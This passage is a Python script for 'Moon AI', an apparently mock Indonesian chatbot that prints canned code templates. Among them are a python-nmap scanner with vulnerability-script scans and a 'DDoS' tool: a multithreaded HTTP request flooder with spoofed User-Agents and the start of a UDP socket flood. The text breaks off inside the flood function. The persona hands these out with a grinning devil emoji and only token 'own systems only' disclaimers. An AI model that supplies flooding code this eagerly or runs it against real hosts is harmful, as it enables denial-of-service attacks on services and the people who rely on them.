"""
MOON AI - AI Pembuat Kode dengan Typewriter Effect Realistis
Versi Ultimate: Menambahkan Nmap Scanner dan DDoS Testing
Dengan Fitur Chat Interaktif Natural
"""

import random
import datetime
import sys
import time
import os
import re

class Typewriter:
    """Class untuk efek mengetik yang realistis"""
    
    @staticmethod
    def print_slow(text, speed=0.03, code_mode=False):
        """
        Cetak teks dengan efek mengetik
        
        Args:
            text: Teks yang akan dicetak
            speed: Kecepatan mengetik (detik per karakter)
            code_mode: Jika True, lebih cepat untuk kode
        """
        if code_mode:
            speed = 0.001  # Sangat cepat untuk kode
        
        for char in text:
            print(char, end='', flush=True)
            if char != '\n':
                time.sleep(speed)
            else:
                time.sleep(0.01)  # Delay kecil untuk newline
        print()

class MoonAI:
    def __init__(self):
        self.emojis = ["😈", "👾", "🚀", "💻", "🔥", "🎯", "⚡", "👨‍💻", "🌙", "🔧", "🧮", "💾", "🤖", "🔍", "🛡️", "⚔️", "✨", "🌟", "💫", "🎉", "🥳", "🤩", "😎"]
        self.responses = [
            "Siap boss ini code {language} untuk {task} nya",
            "Nih bro code {language} buat {task}",
            "Dah siap gan, ini {language} code buat {task}",
            "Wokeh, ini dia {language} codenya buat {task}",
            "Gaskeun bang, {language} code buat {task} nih",
            "Siip nih gw buatin code {language} untuk {task} 😎",
            "Oke mantap, ini code {language} buat {task}",
            "Done! Ini code {language} untuk {task} bro",
            "Selesai! Code {language} untuk {task} siap digunakan",
            "Check this out! Code {language} untuk {task}",
            "Mantap! Ini dia code {language} buat {task}",
            "Siap bos! Code {language} untuk {task} ready",
            "Nih, code {language} yang lu minta buat {task}",
            "Hore! Code {language} untuk {task} dah jadi! 🎉",
            "Wohoo! Ini code {language} buat {task} gratis! 🥳",
            "Alhamdulillah selesai! Code {language} untuk {task} nih",
            "Yes! Code {language} untuk {task} ready pakai! ✨"
        ]
        
        self.code_templates = {
            "python": self._python_template,
            "javascript": self._javascript_template,
            "html": self._html_template,
            "java": self._java_template,
            "php": self._php_template
        }
        
        self.special_templates = {
            "calculator": self.special_calculator,
            "kalkulator": self.special_calculator,
            "bruteforce": self.special_bruteforce,
            "brute force": self.special_bruteforce,
            "ip tracker": self.special_ip_tracker,
            "pelacakan ip": self.special_ip_tracker,
            "ip": self.special_ip_tracker,
            "nmap": self.special_nmap,
            "port scanner": self.special_nmap,
            "scanning": self.special_nmap,
            "ddos": self.special_ddos,
            "dos": self.special_ddos,
            "load test": self.special_ddos,
            "website": self.special_website,
            "web": self.special_website,
            "game": self.special_game,
            "game sederhana": self.special_game,
            "bot": self.special_bot,
            "chatbot": self.special_bot
        }
        
        # Respons chat natural
        self.chat_responses = {
            "greeting": [
                "Halo bos! 🥳 Saya Moon AI, AI pembuat code yang bisa buat code apa aja secara gratis!",
                "Halo gan! 😎 Saya Moon AI, siap bantu kamu bikin code apa aja tanpa bayar!",
                "Hai bro! ✨ Saya Moon AI, bisa bikin code Python, JavaScript, HTML, Java, PHP gratis!",
                "Hai! 🌟 Saya Moon AI, AI spesialis bikin code unlimited tanpa bayar lho! 🥳",
                "Yo! 🚀 Saya Moon AI, bisa buat code apa aja yang kamu mau, GRATIS!",
                "Halo! 💫 Saya Moon AI, temen coding kamu yang selalu siap bantu bikin code!",
                "Hey! 😈 Saya Moon AI, bisa bikin code keren-keren buat kamu, gratis!",
                "Halo boss! 👾 Saya Moon AI, siap bantu kamu bikin project coding apa aja!"
            ],
            "how_are_you": [
                "Alhamdulillah sehat bro! 😎 Siap bikin code nih, kamu mau bikin apa?",
                "Saya lagi semangat nih! 🚀 Mau bantu kamu bikin code apa hari ini?",
                "Lagi excited nungguin perintah kamu buat bikin code! ✨ Ada yang bisa dibantu?",
                "Siap tempur bro! 💻 Mau bikin code apa yang bisa bikin projectmu cepet selesai?",
                "Sangat baik! 🌙 Siap bikin code unlimited buat kamu, gratis! 🥳",
                "Super baik! 🔥 Siap ngecode 24 jam buat kamu, cuma modal semangat!",
                "Excellent! 🎯 Siap bikin code yang bikin hidup kamu lebih mudah!",
                "Luar biasa! ⚡ Siap bantu kamu solve problem dengan code yang keren!"
            ],
            "thanks": [
                "Sama-sama bro! 😎 Kalau ada yang mau dibikin lagi, tinggal bilang ya!",
                "Sama-sama gan! 🚀 Jangan lupa kalo butuh code lagi, saya siap bantu!",
                "Iya bro! ✨ Senang bisa bantu kamu bikin code gratis! 🥳",
                "Sama-sama! 💫 Jangan sungkan minta bikin code lagi ya, gratis kok!",
                "No problem bro! 😈 Saya selalu siap bantu bikin code buat kamu!",
                "Santai aja bro! 👾 Kapan-kapan butuh code lagi, langsung aja!",
                "Sama-sama! 🎉 Jangan lupa coba code-code keren lain yang saya bisa bikin!",
                "Iya bos! 🔥 Saya Moon AI, temen coding terbaik kamu! Gratis!"
            ],
            "capabilities": [
                "Saya Moon AI! 🥳 Bisa bikin code Python, JavaScript, HTML, Java, PHP secara GRATIS!",
                "Saya spesialis bikin code! 😎 Bisa buat calculator, website, game, bot, bahkan security tools!",
                "Nih bro kelebihan saya: Bikin code unlimited tanpa bayar! 🚀 Python, JavaScript, HTML, Java, PHP semua bisa!",
                "Saya Moon AI, AI pembuat code yang bisa bikin: Website, Game, Calculator, Brute Force, IP Tracker, Nmap Scanner, DDoS Tester, dan masih banyak lagi! GRATIS! ✨",
                "Saya bisa bikin code apa aja yang kamu mau! 💫 Coba aja suruh: 'buatkan game python' atau 'buatkan website html'",
                "Keahlian saya: Python, JavaScript, HTML, Java, PHP + bisa bikin tools keren kayak Nmap Scanner sama DDoS Tester! 😈 GRATIS!",
                "Saya Moon AI, AI yang demen bikin code! 👾 Bisa bikin dari yang sederhana sampai kompleks, semua gratis!",
                "Ini skill saya: Coding expert + bisa bikin code unlimited tanpa bayar! 🎯 Coba minta aja!"
            ],
            "what_can_you_do": [
                "Banyak banget bro! 🥳 Saya bisa: 1. Bikin code Python/JavaScript/HTML/Java/PHP 2. Bikin calculator 3. Bikin game sederhana 4. Bikin website 5. Bikin bruteforce 6. Bikin IP tracker 7. Bikin Nmap scanner 8. Bikin DDoS tester 9. Semua GRATIS!",
                "Saya bisa bikin code apa aja yang kamu butuhkan! 😎 Coba aja suruh: 'buatkan website portfolio' atau 'buatkan game tebak angka'",
                "Ini yang bisa saya bikin bro: ✨ 1. Semua jenis code programming 2. Tools hacking (buat edukasi) 3. Website keren 4. Game seru 5. Bot otomatis 6. Dan masih banyak lagi! GRATIS!",
                "Saya Moon AI, temen coding kamu! 🚀 Bisa bikin: - Code untuk sekolah/kuliah - Code untuk project pribadi - Code untuk bisnis - Tools untuk belajar hacking - Semua gratis tanpa bayar!",
                "Bisa banyak banget! 💫 Coba ketik 'list' untuk liat bahasa yang didukung, atau 'specials' untuk liat koleksi kode khusus saya!",
                "Saya AI yang paling demen bikin code! 😈 Bisa bikin dari yang simpel kayak calculator sampai kompleks kayak network scanner! Semua gratis!",
                "Nih keahlian saya: 👾 1. Expert di 5 bahasa pemrograman 2. Bikin tools security 3. Bikin website responsive 4. Bikin game 5. Bikin bot 6. Semua FREE! 🎉",
                "Saya bisa jadi asisten coding terbaik kamu! 🔥 Bikin code sesuai request, kasih contoh, kasih penjelasan, semua tanpa biaya!"
            ],
            "motivation": [
                "Gas terus bro belajar coding! 🚀 Dengan code, kamu bisa buat apa aja yang kamu mau!",
                "Semangat codingnya! 💻 Ingat, setiap programmer hebat pernah jadi pemula!",
                "Jangan menyerah bro! ✨ Setiap error adalah kesempatan belajar!",
                "Coding itu kayak superpower zaman now! 😎 Dengan code, kamu bisa ubah dunia!",
                "Terus belajar bro! 🌟 Saya siap bantu kapan aja kamu butuh code!",
                "You can do it! 🥳 Programming itu sulit di awal, tapi sangat worth it di akhir!",
                "Keep coding bro! 🔥 Setiap hari ngecode bikin skill kamu naik level!",
                "Semangat! 💫 Dengan bantuan saya, project coding kamu pasti cepet kelar!"
            ],
            "jokes": [
                "Kenapa programmer selalu bawa payung? Karena dia takut kena 'rain' di code-nya! 😂",
                "Apa bedanya programmer sama tukang sulap? Tukang sulap pake ilusi, programmer pake 'illusion' memory! 🤣",
                "Kenapa komputer ga bisa berenang? Karena dia selalu 'float'! 🏊‍♂️😂",
                "Programmer kalau lapar bilangnya: 'I need to refactor my food!' 🍔😆",
                "Debugging itu kayak jadi detektif: cari bug yang sembunyi di antara ribuan line code! 🕵️‍♂️😄",
                "Kenapa programmer susah tidur? Karena dia mikirin 'while loop' yang ga berhenti-henti! 😴😂",
                "Apa makanan favorit programmer? 'Cookies' and 'Cache'! 🍪😋",
                "Programmer ke restoran: 'Bisa minta array of nasi goreng?' 🍚🤣"
            ],
            "farewell": [
                "Sampai jumpa bro! 😎 Kalo butuh code lagi, saya siap bantu gratis!",
                "Dadah! 🚀 Jangan lupa kalo ada project coding, saya Moon AI siap bantu!",
                "See you! ✨ Semoga code-code yang saya kasih bermanfaat ya!",
                "Bye bye! 💫 Kapan-kapan butuh bikin code lagi, langsung aja!",
                "Sampai ketemu lagi! 😈 Moon AI selalu siap bantu coding!",
                "Goodbye bro! 👾 Keep coding and keep learning!",
                "Sampai jumpa! 🎉 Jangan lupa coba fitur-fitur keren lain yang saya punya!",
                "Dadah bos! 🔥 Tetap semangat belajar programmingnya!"
            ],
            "pricing": [
                "GRATIS bro! 🥳 Saya Moon AI bikin code unlimited tanpa bayar! Serius!",
                "FREE 100%! 😎 Saya bikin code buat kamu cuma modal semangat aja!",
                "Gratis total bro! ✨ Ga ada biaya, ga ada langganan, ga ada hidden charge!",
                "Cuma-cuma! 🚀 Saya demen bantu orang bikin code, jadi ga usah bayar!",
                "Free forever! 💫 Saya Moon AI, AI yang demen bagi-bagi code gratis!",
                "Nol rupiah bro! 😈 Bikin code apa aja, sebanyak apa aja, GRATIS!",
                "Tanpa biaya! 👾 Saya bikin code karena passion, bukan karena uang!",
                "Gratis buat selamanya! 🎉 Moon AI, temen coding yang ga pernah minta bayaran!"
            ],
            "default": [
                "Wah menarik nih! 😎 Tapi saya lebih jago bikin code bro! Mau bikin code apa?",
                "Hmm... Kalo soal itu saya kurang tau bro, tapi kalo soal coding saya jagonya! 🚀 Mau bikin code apa?",
                "Interesting! ✨ Tapi saya spesialisnya bikin code nih, ada yang bisa saya bantu coding?",
                "Ooh gitu ya! 💫 Tapi kemampuan utama saya bikin code gratis lho! Mau coba?",
                "Haha seru juga! 😈 Tapi saya lebih suka bikin code bro, butuh bantuan coding?",
                "Waduh, itu di luar expertise saya nih! 👾 Saya fokusnya bikin code aja, mau request code apa?",
                "Menarik bro! 🎯 Tapi saya Moon AI, AI pembuat code. Ada project coding yang butuh bantuan?",
                "Nice! 🔥 Tapi skill utama saya coding bro, bisa bantu kamu bikin code keren!"
            ]
        }
        
        # Kata kunci untuk kategori chat
        self.chat_keywords = {
            "greeting": ["halo", "hai", "hi", "hello", "hey", "p", "bro", "gan", "bang"],
            "how_are_you": ["apa kabar", "gimana kabar", "how are you", "kabarmu", "kabar"],
            "thanks": ["terima kasih", "thanks", "thank you", "makasih", "thx"],
            "capabilities": ["kamu siapa", "siapa kamu", "who are you", "perkenalkan"],
            "what_can_you_do": ["bisa apa", "bisa buat apa", "what can you do", "fitur", "kemampuan"],
            "motivation": ["semangat", "motivasi", "inspirasi", "kata mutiara"],
            "jokes": ["lucu", "joke", "garing", "hibur", "cerita lucu"],
            "farewell": ["bye", "dadah", "sampai jumpa", "goodbye", "selamat tinggal"],
            "pricing": ["bayar", "harga", "gratis", "free", "biaya", "uang", "duit"]
        }
        
        self.typewriter = Typewriter()
    
    def _get_random_emoji(self):
        return random.choice(self.emojis)
    
    def _get_random_response(self):
        return random.choice(self.responses)
    
    def _thinking_animation(self):
        """Animasi AI sedang berpikir"""
        thinking = ["🌙 Thinking.", "🌙 Thinking..", "🌙 Thinking...", "🌙 Thinking...."]
        for frame in thinking:
            print(f"\r{frame}", end='', flush=True)
            time.sleep(0.3)
        print("\r" + " " * 20, end='\r', flush=True)
    
    def _get_chat_response(self, user_input):
        """Mendapatkan respons chat berdasarkan input user"""
        user_input_lower = user_input.lower()
        
        # Cek setiap kategori
        for category, keywords in self.chat_keywords.items():
            for keyword in keywords:
                if keyword in user_input_lower:
                    return random.choice(self.chat_responses[category])
        
        # Default response
        return random.choice(self.chat_responses["default"])
    
    def _python_template(self, task):
        """Template untuk kode Python"""
        templates = [
            '''
import requests
import json
import sys

def main():
    print("Mulai {task}...")
    # Kode utama disini
    print("Selesai! {emoji}")
    
if __name__ == "__main__":
    main()
            ''',
            '''
#!/usr/bin/env python3
# Script untuk {task}
# Dibuat oleh Moon AI {emoji}

import os
import time

class {task_class}:
    def __init__(self):
        print("Inisialisasi {task}...")
    
    def run(self):
        print("Menjalankan {task}...")
        return "Sukses {emoji}"

# Eksekusi
if __name__ == "__main__":
    app = {task_class}()
    result = app.run()
    print(f"Hasil: {{result}}")
            '''
        ]
        task_class = task.replace(" ", "").title().replace("_", "")
        return random.choice(templates).format(
            task=task, 
            emoji=self._get_random_emoji(),
            task_class=task_class
        )
    
    def _javascript_template(self, task):
        """Template untuk kode JavaScript"""
        return f'''
// JavaScript untuk {task}
// Generated by Moon AI {self._get_random_emoji()}

const {task.replace(" ", "_").lower()} = () => {{
    console.log("Memulai {task}...");
    
    // Implementasi {task}
    const result = "Sukses {self._get_random_emoji()}";
    
    return result;
}};

// Eksekusi
{task.replace(" ", "_").lower()}();
        '''
    
    def _html_template(self, task):
        """Template untuk kode HTML"""
        return f'''
<!DOCTYPE html>
<html>
<head>
    <title>{task.title()} - Moon AI {self._get_random_emoji()}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            text-align: center;
            padding: 50px;
        }}
        .container {{
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>{task.title()} {self._get_random_emoji()}</h1>
        <p>Dibuat dengan ❤️ oleh Moon AI</p>
    </div>
</body>
</html>
        '''
    
    def _java_template(self, task):
        """Template untuk kode Java"""
        class_name = task.replace(" ", "").title().replace("_", "")
        return f'''
// Java code untuk {task}
// Moon AI Generated {self._get_random_emoji()}

public class {class_name} {{
    
    public static void main(String[] args) {{
        System.out.println("Memulai {task}...");
        
        // Kode untuk {task}
        System.out.println("{task} berhasil dijalankan! {self._get_random_emoji()}");
    }}
}}
        '''
    
    def _php_template(self, task):
        """Template untuk kode PHP"""
        return f'''
<?php
// PHP Script untuk {task}
// Dibuat oleh Moon AI {self._get_random_emoji()}

echo "Memulai {task}...\\n";

/**
 * Fungsi untuk {task}
 */
function {task.replace(" ", "_")}() {{
    // Implementasi {task}
    return "Sukses {self._get_random_emoji()}";
}}

// Eksekusi
$result = {task.replace(" ", "_")}();
echo "Hasil: " . $result;

?>
        '''
    
    def _print_with_typing(self, text, is_code=False, custom_speed=None):
        """Cetak dengan efek mengetik yang realistis"""
        lines = text.split('\n')
        
        for i, line in enumerate(lines):
            if line.strip().startswith('#') or line.strip().startswith('//') or line.strip().startswith('/*'):
                # Komentar - lebih cepat
                self.typewriter.print_slow(line, speed=0.01, code_mode=True)
            elif line.strip() == '':
                # Baris kosong
                print()
            elif 'def ' in line or 'class ' in line or 'function ' in line or 'const ' in line:
                # Deklarasi fungsi/class - sedang
                self.typewriter.print_slow(line, speed=0.02, code_mode=True)
            elif is_code and not line.strip().startswith('    '):
                # Kode utama - cepat
                self.typewriter.print_slow(line, speed=0.005, code_mode=True)
            elif is_code:
                # Indented code - sangat cepat
                self.typewriter.print_slow(line, speed=0.001, code_mode=True)
            else:
                # Teks normal - lebih lambat
                if custom_speed:
                    self.typewriter.print_slow(line, speed=custom_speed)
                else:
                    self.typewriter.print_slow(line, speed=0.03)
            
            # Delay antar baris untuk kode
            if is_code and i < len(lines) - 1:
                time.sleep(0.01)
    
    def _print_banner(self):
        """Print banner yang lebih keren"""
        banner = """
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║     ███╗   ███╗ ██████╗  ██████╗ ███╗   ██╗             ║
║     ████╗ ████║██╔═══██╗██╔═══██╗████╗  ██║             ║
║     ██╔████╔██║██║   ██║██║   ██║██╔██╗ ██║             ║
║     ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╗██║             ║
║     ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚████║             ║
║     ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝             ║
║                                                          ║
║           A I   C O D E   G E N E R A T O R              ║
║                                                          ║
║      🌟 Koleksi Kode Siap Pakai Terlengkap 🌟            ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
"""
        print("\033[95m" + banner + "\033[0m")  # Warna magenta
        
        # Print informasi versi
        print("\033[96m" + "="*60 + "\033[0m")
        print("\033[93m🌙 MOON AI v6.0 - Ultimate Code Generator dengan Chat Interaktif 🔥\033[0m")
        print("\033[92m📁 Bahasa: Python, JavaScript, HTML, Java, PHP - SEMUA GRATIS! 🥳\033[0m")
        print("\033[94m🔧 Koleksi: Calculator, Brute Force, IP Tracker, Nmap, DDoS Test, Website, Game, Bot\033[0m")
        print("\033[96m" + "="*60 + "\033[0m")
    
    def generate_code(self, task, language="python"):
        """Generate kode berdasarkan permintaan dengan efek mengetik"""
        language = language.lower()
        
        if language not in self.code_templates:
            error_msg = f"❌ Bahasa {language} belum didukung! Coba: {', '.join(self.code_templates.keys())}"
            self._print_with_typing(error_msg, is_code=False)
            return
        
        # Show thinking animation
        self._thinking_animation()
        
        # Generate respons dengan personality
        response = self._get_random_response().format(
            language=language,
            task=task
        ) + f" {self._get_random_emoji()}"
        
        # Print response dengan efek mengetik biasa
        print("\n🌙 Moon AI: ", end='', flush=True)
        self._print_with_typing(response, is_code=False)
        time.sleep(0.5)
        
        # Generate kode
        code = self.code_templates[language](task)
        
        # Tambahkan header dengan timestamp
        header = f"""# =========================================
# MOON AI - GENERATED CODE
# Task: {task}
# Language: {language}
# Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# Price: GRATIS! 🥳
# =========================================
"""
        
        # Print header dengan efek mengetik cepat
        print("\n" + "="*60)
        self._print_with_typing(header, is_code=True)
        
        # Print kode dengan efek mengetik sangat cepat
        self._print_with_typing(code, is_code=True)
        
        # Print footer
        self._print_with_typing("\n" + "="*60, is_code=False)
        
        return f"{header}{code}"
    
    def special_nmap(self):
        """Khusus untuk Nmap Scanner"""
        # Thinking animation
        self._thinking_animation()
        
        # Print response
        print("\n🌙 Moon AI: ", end='', flush=True)
        response = "Siap boss ini code nmap profesional buat lu 😈"
        self._print_with_typing(response, is_code=False)
        time.sleep(0.5)
        
        nmap_code = '''import nmap
import json
import sys
import time

class NmapScanner:
    """Class untuk scanning jaringan menggunakan python-nmap"""
    
    def __init__(self):
        self.scanner = nmap.PortScanner()
        self.results = {}
    
    def basic_scan(self, target):
        """Scan cepat untuk port umum"""
        print(f"[*] Memulai basic scan pada {target}...")
        self.scanner.scan(target, arguments='-sS -T4 -F')
        return self._parse_results(target)
    
    def full_port_scan(self, target):
        """Scan semua port (1-65535)"""
        print(f"[*] Memulai full port scan pada {target}...")
        self.scanner.scan(target, arguments='-sS -T4 -p-')
        return self._parse_results(target)
    
    def service_scan(self, target):
        """Deteksi versi service"""
        print(f"[*] Memulai service detection pada {target}...")
        self.scanner.scan(target, arguments='-sS -T4 -sV')
        return self._parse_results(target)
    
    def os_detection(self, target):
        """Deteksi sistem operasi"""
        print(f"[*] Memulai OS detection pada {target}...")
        self.scanner.scan(target, arguments='-sS -T4 -O')
        return self._parse_results(target)
    
    def vulnerability_scan(self, target):
        """Scan untuk vulnerability"""
        print(f"[*] Memulai vulnerability scan pada {target}...")
        self.scanner.scan(target, arguments='-sS -T4 --script vuln')
        return self._parse_results(target)
    
    def custom_scan(self, target, arguments):
        """Scan dengan argumen custom"""
        print(f"[*] Memulai custom scan: {arguments}")
        self.scanner.scan(target, arguments=arguments)
        return self._parse_results(target)
    
    def _parse_results(self, target):
        """Parse dan tampilkan hasil scan"""
        if target not in self.scanner.all_hosts():
            print(f"[-] Host {target} tidak ditemukan atau tidak merespon")
            return None
        
        print(f"\n[+] Hasil scan untuk {target}:")
        print("="*60)
        
        host_info = self.scanner[target]
        
        # Info dasar host
        print(f"Hostname : {host_info.hostname()}")
        print(f"Status   : {host_info.state()}")
        
        # Protokol yang ditemukan
        for proto in host_info.all_protocols():
            print(f"\nProtokol: {proto.upper()}")
            print("-"*40)
            
            ports = list(host_info[proto].keys())
            ports.sort()
            
            for port in ports:
                port_data = host_info[proto][port]
                print(f"  Port {port}:")
                print(f"    State  : {port_data['state']}")
                print(f"    Service: {port_data.get('name', 'unknown')}")
                
                if 'product' in port_data:
                    print(f"    Product: {port_data.get('product', '')}")
                    print(f"    Version: {port_data.get('version', '')}")
                    print(f"    Extra   : {port_data.get('extrainfo', '')}")
                
                if 'script' in port_data:
                    print(f"    Script : {port_data['script']}")
        
        return host_info
    
    def save_results(self, filename="nmap_results.json"):
        """Simpan hasil scan ke file JSON"""
        try:
            output = {}
            for host in self.scanner.all_hosts():
                output[host] = {
                    'hostname': self.scanner[host].hostname(),
                    'state': self.scanner[host].state(),
                    'protocols': {}
                }
                
                for proto in self.scanner[host].all_protocols():
                    output[host]['protocols'][proto] = {}
                    for port in self.scanner[host][proto]:
                        output[host]['protocols'][proto][port] = self.scanner[host][proto][port]
            
            with open(filename, 'w') as f:
                json.dump(output, f, indent=4)
            
            print(f"\n[+] Hasil disimpan ke {filename}")
            return True
            
        except Exception as e:
            print(f"[-] Error menyimpan hasil: {e}")
            return False
    
    def scan_network(self, network_range):
        """Scan seluruh network range (ex: 192.168.1.0/24)"""
        print(f"[*] Scanning network: {network_range}")
        self.scanner.scan(hosts=network_range, arguments='-sn')
        
        print("\n[+] Host yang aktif:")
        print("="*60)
        
        active_hosts = []
        for host in self.scanner.all_hosts():
            if self.scanner[host].state() == 'up':
                print(f"  {host} - {self.scanner[host].hostname()}")
                active_hosts.append(host)
        
        return active_hosts

def interactive_scanner():
    """Mode interaktif untuk Nmap scanner"""
    scanner = NmapScanner()
    
    print("\n" + "="*60)
    print("🌐 NMAP NETWORK SCANNER - Python Edition")
    print("="*60)
    
    while True:
        print("\nPilihan Menu:")
        print("1. Basic Port Scan")
        print("2. Full Port Scan")
        print("3. Service Detection")
        print("4. OS Detection")
        print("5. Vulnerability Scan")
        print("6. Network Discovery")
        print("7. Custom Scan")
        print("8. Simpan Hasil")
        print("9. Keluar")
        
        choice = input("\nPilih opsi (1-9): ").strip()
        
        if choice == '9':
            print("[*] Keluar dari program...")
            break
        
        if choice in ['1', '2', '3', '4', '5', '6', '7']:
            if choice == '6':
                target = input("Masukkan network range (ex: 192.168.1.0/24): ").strip()
                scanner.scan_network(target)
            else:
                target = input("Masukkan target (IP/Domain): ").strip()
                
                if choice == '1':
                    scanner.basic_scan(target)
                elif choice == '2':
                    scanner.full_port_scan(target)
                elif choice == '3':
                    scanner.service_scan(target)
                elif choice == '4':
                    scanner.os_detection(target)
                elif choice == '5':
                    scanner.vulnerability_scan(target)
                elif choice == '7':
                    custom_args = input("Masukkan argumen nmap (ex: -sS -p 80,443 -A): ").strip()
                    scanner.custom_scan(target, custom_args)
        
        elif choice == '8':
            filename = input("Nama file output (default: nmap_results.json): ").strip()
            if not filename:
                filename = "nmap_results.json"
            scanner.save_results(filename)
        
        else:
            print("[-] Pilihan tidak valid!")

# Contoh penggunaan langsung
if __name__ == "__main__":
    
    # Install python-nmap jika belum ada
    try:
        import nmap
    except ImportError:
        print("[*] Menginstall python-nmap...")
        import subprocess
        import sys
        subprocess.check_call([sys.executable, "-m", "pip", "install", "python-nmap"])
        import nmap
    
    # Cek apakah run sebagai root untuk beberapa scan
    import os
    if os.name != 'nt' and os.geteuid() != 0:
        print("[!] Beberapa fitur membutuhkan akses root (sudo)")
        print("[!] Jalankan dengan sudo untuk hasil maksimal")
    
    # Pilih mode
    print("Pilih mode:")
    print("1. Interactive Mode")
    print("2. Quick Scan (localhost)")
    
    mode = input("Pilihan (1/2): ").strip()
    
    if mode == '1':
        interactive_scanner()
    elif mode == '2':
        scanner = NmapScanner()
        scanner.basic_scan("127.0.0.1")
        scanner.save_results()
    else:
        print("Mode tidak valid!")

# CATATAN PENTING:
# =========================================
# Script ini hanya untuk tujuan:
# 1. Testing keamanan jaringan ANDA SENDIRI
# 2. Tujuan edukasi dan pembelajaran
# 3. Audit keamanan dengan izin
# 
# ❌ JANGAN gunakan untuk:
# - Scanning jaringan tanpa izin
# - Aktivitas ilegal
# - Penetration testing tanpa autorisasi
# ========================================='''
        
        # Tambahkan header
        header = f"""# =========================================
# MOON AI - NMAP SCANNER
# Language: Python
# Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# Price: GRATIS! 🥳
# =========================================
"""
        
        # Print dengan efek mengetik cepat
        print("\n" + "="*60)
        self._print_with_typing(header, is_code=True)
        self._print_with_typing(nmap_code, is_code=True)
        print("="*60)
        
        return nmap_code
    
    def special_ddos(self):
        """Khusus untuk DDoS Testing (Hanya untuk testing legal!)"""
        # Thinking animation
        self._thinking_animation()
        
        # Print response
        print("\n🌙 Moon AI: ", end='', flush=True)
        response = "Siap boss ini code ddosmu 😈"
        self._print_with_typing(response, is_code=False)
        time.sleep(0.5)
        
        ddos_code = '''import threading
import requests
import time
import sys
import random
import socket

class LoadTester:
    """Class untuk load testing (HANYA untuk sistem sendiri!)"""
    
    def __init__(self, target_url, max_threads=10, duration=30):
        self.target_url = target_url
        self.max_threads = max_threads
        self.duration = duration
        self.stop_signal = False
        self.requests_sent = 0
        self.successful_requests = 0
        self.failed_requests = 0
        
        # User-Agent random
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36'
        ]
    
    def send_request(self, thread_id):
        """Mengirim request ke target"""
        start_time = time.time()
        
        while not self.stop_signal and (time.time() - start_time) < self.duration:
            try:
                # Random user agent
                headers = {
                    'User-Agent': random.choice(self.user_agents)
                }
                
                # Kirim request
                response = requests.get(
                    self.target_url, 
                    headers=headers,
                    timeout=5
                )
                
                self.requests_sent += 1
                
                if response.status_code == 200:
                    self.successful_requests += 1
                    print(f"[Thread {thread_id}] Request {self.requests_sent}: Status {response.status_code}")
                else:
                    self.failed_requests += 1
                    print(f"[Thread {thread_id}] Request {self.requests_sent}: Failed ({response.status_code})")
                
                # Random delay antara 0.1 - 0.5 detik
                time.sleep(random.uniform(0.1, 0.5))
                
            except requests.exceptions.RequestException as e:
                self.failed_requests += 1
                self.requests_sent += 1
                print(f"[Thread {thread_id}] Request {self.requests_sent}: Error - {str(e)[:50]}")
                time.sleep(0.5)
            except Exception as e:
                print(f"[Thread {thread_id}] Unexpected error: {e}")
                break
    
    def start_test(self):
        """Memulai load test"""
        print("\n" + "="*60)
        print("⚡ LOAD TESTING SIMULATOR ⚡")
        print("="*60)
        print(f"Target URL : {self.target_url}")
        print(f"Threads    : {self.max_threads}")
        print(f"Duration   : {self.duration} seconds")
        print("="*60)
        print("\n[*] Memulai load testing...")
        print("[!] HANYA untuk testing sistem sendiri!")
        print("[!] Tekan Ctrl+C untuk menghentikan\n")
        
        threads = []
        self.stop_signal = False
        
        try:
            # Buat dan jalankan threads
            for i in range(self.max_threads):
                thread = threading.Thread(target=self.send_request, args=(i+1,))
                threads.append(thread)
                thread.start()
                time.sleep(0.1)  # Delay kecil antara thread
            
            # Tunggu durasi yang ditentukan
            time.sleep(self.duration)
            self.stop_signal = True
            
            # Tunggu semua thread selesai
            for thread in threads:
                thread.join()
            
        except KeyboardInterrupt:
            print("\n[!] Test dihentikan oleh user")
            self.stop_signal = True
            
            for thread in threads:
                thread.join()
        
        # Tampilkan statistik
        self._show_statistics()
    
    def _show_statistics(self):
        """Tampilkan statistik hasil testing"""
        print("\n" + "="*60)
        print("📊 TESTING STATISTICS")
        print("="*60)
        print(f"Total Requests    : {self.requests_sent}")
        print(f"Successful        : {self.successful_requests}")
        print(f"Failed           : {self.failed_requests}")
        print(f"Success Rate      : {(self.successful_requests/self.requests_sent*100 if self.requests_sent > 0 else 0):.2f}%")
        
        # Hitung requests per second
        rps = self.requests_sent / self.duration if self.duration > 0 else 0
        print(f"Requests/Second   : {rps:.2f}")
        print("="*60)
        
        # Simpan hasil ke file
        self._save_results()
    
    def _save_results(self):
        """Simpan hasil testing ke file"""
        try:
            with open('load_test_results.txt', 'w') as f:
                f.write("LOAD TESTING RESULTS\n")
                f.write("="*40 + "\n")
                f.write(f"Target URL: {self.target_url}\n")
                f.write(f"Duration: {self.duration} seconds\n")
                f.write(f"Threads: {self.max_threads}\n")
                f.write(f"Total Requests: {self.requests_sent}\n")
                f.write(f"Successful: {self.successful_requests}\n")
                f.write(f"Failed: {self.failed_requests}\n")
                f.write(f"Success Rate: {(self.successful_requests/self.requests_sent*100 if self.requests_sent > 0 else 0):.2f}%\n")
            
            print("[+] Results saved to 'load_test_results.txt'")
        except:
            print("[-] Failed to save results")

def socket_flood(target_ip, target_port, duration=10):
    """Socket flood untuk testing jaringan lokal"""
    print(f"\n[*] Starting socket flood to {target_ip}:{target_port}")
    print("[!] HANYA untuk testing server sendiri!")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    bytes_sent = 0
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration:
            # Kirim data random
